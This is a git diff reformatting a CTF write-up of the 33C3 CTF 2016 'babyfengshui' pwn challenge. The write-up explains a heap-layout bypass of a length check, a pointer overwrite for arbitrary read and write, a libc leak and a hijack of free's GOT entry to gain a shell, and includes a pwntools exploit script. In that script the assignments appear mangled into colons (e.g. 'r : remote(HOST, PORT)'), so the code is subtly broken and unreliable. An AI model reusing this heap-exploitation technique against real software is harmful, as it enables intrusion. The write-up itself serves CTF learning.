@@ -1,18 +1,18 @@
 ---
 type: ctf
-title : 33C3 CTF 2016 - babyfengshui
+title: 33C3 CTF 2016 - babyfengshui
 tags: [33C3 CTF, babyfengshui]
-date : 2016-12-30
+date: 2016-12-30
 author: Eno
 featuredImage: https://i.ytimg.com/vi/XuzuFUGuQv0/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC-sS21UU4ZN8mo8p1JTvi1KiZUew
 ---
 
-**Category:** pwn
-**Points:** 150
+**Category:** pwn **Points:** 150
 
-32 bit ELF, with Partial RELRO, canary & NX enabled, No PIE  
+32 bit ELF, with Partial RELRO, canary & NX enabled, No PIE
 
 program menu:
+
 ```
 $ ./babyfengshui
 0: Add a user
@@ -21,38 +21,49 @@ $ ./babyfengshui
 3: Update a user description
 4: Exit
 ```
+
 Add a user:
+
 ```
 Action: 0
 size of description: 50 <-- max length of description
-name: AAAA 
+name: AAAA
 text length: 12 <-- actual length of description
 text: 1234
 ```
+
 Show a user:
+
 ```
 Action: 2
 index: 0 <-- user's index
 name: AAAA
 description: 1234
 ```
+
 Update a user:
+
 ```
 Action: 3
 index: 0
 text length: 10 <-- new length of the description
 text: 1234567890
 ```
+
 Here's the data structure of a user:
-```c 
+
+```c
 struct user{
     char* desc;
     char name[124];
 };
 ```
-The program will free `user->desc` & `user` while deleting a user. It also clear the pointer of the `user`, so there's no Use-After-Free vulnerability. 
+
+The program will free `user->desc` & `user` while deleting a user. It also clear the pointer of the `user`, so there's
+no Use-After-Free vulnerability.
 
 The program has some strange protection while setting the user's description:
+
 ```c
 // users : struct user *users[]
 if ( &users[id]->desc[text_len] >= &users[id] - 4 )
@@ -63,9 +74,12 @@ if ( &users[id]->desc[text_len] >= &users[id] - 4 )
 printf("text: ");
 read_n(users[id]->desc, text_len + 1);
 ```
-So `user->desc + text_len` must < `user` (both `user->desc` and `user` are pointers). Guess it use this protection to avoid heap overflow.
+
+So `user->desc + text_len` must < `user` (both `user->desc` and `user` are pointers). Guess it use this protection to
+avoid heap overflow.
 
 But what if we have the following heap memory layout?
+
 ```
 
             +-----------------------+
@@ -88,9 +102,14 @@ userD->desc |                       |
             |                       |
             +-----------------------+
 ```
-According to the protection, `userD->desc + text_len` should less than `userD`, **which means it will be ok to overwrite the whole `userB` and `userC`**.
 
-It is possible to arrange the above heap memory layout if we're familiar with malloc's memory allocation. We can then exploit the heap overflow vulnerability and modify the `userB->desc` pointer, making us able to do the **read/write anywhere** attack. After that is pretty simple, we leak the libc's base address and hijack `free`'s GOT to get the shell.
+According to the protection, `userD->desc + text_len` should less than `userD`, **which means it will be ok to overwrite
+the whole `userB` and `userC`**.
+
+It is possible to arrange the above heap memory layout if we're familiar with malloc's memory allocation. We can then
+exploit the heap overflow vulnerability and modify the `userB->desc` pointer, making us able to do the **read/write
+anywhere** attack. After that is pretty simple, we leak the libc's base address and hijack `free`'s GOT to get the
+shell.
 
 ```python exp_baby.py
 #!/usr/bin/env python
@@ -105,7 +124,7 @@ PORT : 1456
 ELF_PATH : "./babyfengshui_noalarm"
 LIBC_PATH : "./libc-2.19.so"
 
-# setting 
+# setting
 context.arch : 'i386'
 context.os : 'linux'
 context.endian : 'little'
@@ -141,13 +160,13 @@ if __name__ == "__main__":
 
     r : remote(HOST, PORT)
     #r : process(ELF_PATH)
-    
+
     add_user(50, "A"*123, 12, "a"*12)
-    add_user(50, "B"*123, 12, "b"*12) 
+    add_user(50, "B"*123, 12, "b"*12)
     add_user(50, "C"*123, 12, "sh\x00") # user[2], desc : "sh\x00" (for later's GOT hijacking)
     del_user(0)
     add_user(90, "D"*123, 12, "d"*12)
-    add_user(50, "E"*123, 0x100, "i"*0xf8 + p32(elf.got['__libc_start_main'])) 
+    add_user(50, "E"*123, 0x100, "i"*0xf8 + p32(elf.got['__libc_start_main']))
     # now user[4]'s desc is user[0]'s desc (in previous)
     # user[4]->desc + 0x2c8 : user[4], which means we can overflow user[4]->desc & overwrite user[1]->desc to libc_start_main@got.plt
 
@@ -158,7 +177,7 @@ if __name__ == "__main__":
     system_addr : libc.symbols['system']
     log.success("libc: "+hex(libc.address))
     log.success("system: "+hex(system_addr))
-    
+
     # change user[1]->desc into free@got.plt
     # hijack free's got, then free user[2] to get shell
     update_user(4, 0x100, "i"*0xf8 + p32(elf.got['free']))
